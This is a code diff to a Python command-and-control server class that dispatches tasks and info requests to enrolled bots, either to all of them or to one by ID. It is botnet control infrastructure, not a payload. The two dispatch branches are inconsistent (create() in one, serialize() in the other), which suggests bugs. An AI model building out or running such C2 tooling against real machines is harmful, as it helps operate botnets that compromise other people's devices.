@@ -78,23 +78,30 @@ class C2Server(QBalancedServer):
         key = generate_key().decode()
         self.write(bot_id, {"event_type": "assign", "bot_id": bot_id, "encryption_key": key})
 
-    @Slot(int, str)
-    def send_task(self, bot_id: int, task: str):
+    @Slot(int, str, dict, int)
+    def send_task(self, bot_id: int, task: str, kwargs: dict, user_activity: int):
         """Send task."""
         if bot_id == 0:
-            for bot in self.bots:
+            for bot in self.getDevices():
                 bot_id = bot.get_id()
                 task_id = bot.get_next_task_id()
-                task_obj = Task(bot_id, task_id, task, "queued")
+                task_obj = Task(bot_id, task_id, task, kwargs)
+                task_obj.user_activity = user_activity
                 bot.on_task_received(task_obj)
-                self.write(bot_id, task_obj.serialize())
+                task_dict = task_obj.create()
+                task_dict["event"] = "start"
+                self.write(bot_id, task_dict)
+                self.task.emit(task_obj)
         else:
             bot = self.getDeviceById(bot_id)
             if bot:
                 task_id = bot.get_next_task_id()
-                task_obj = Task(bot_id, task_id, task, "queued")
+                task_obj = Task(bot_id, task_id, task, kwargs)
                 bot.on_task_received(task_obj)
-                self.write(bot_id, task_obj.serialize())
+                task_dict = task_obj.serialize()
+                task_dict["event"] = "start"
+                self.write(bot_id, task_dict)
+                self.task.emit(task_obj)
             else:
                 self.logger.error("BOT-{} not found".format(bot_id))
 
@@ -102,7 +109,7 @@ class C2Server(QBalancedServer):
     def send_info(self, bot_id: int, info: list):
         """Send info request."""
         bot = self.getDeviceById(bot_id)
-        info_obj = Info(bot_id, info, "queued")
+        info_obj = Info(bot_id, info)
         bot.on_info_received(info_obj)
         if bot_id == 0:
             self.writeAll(info_obj.serialize())
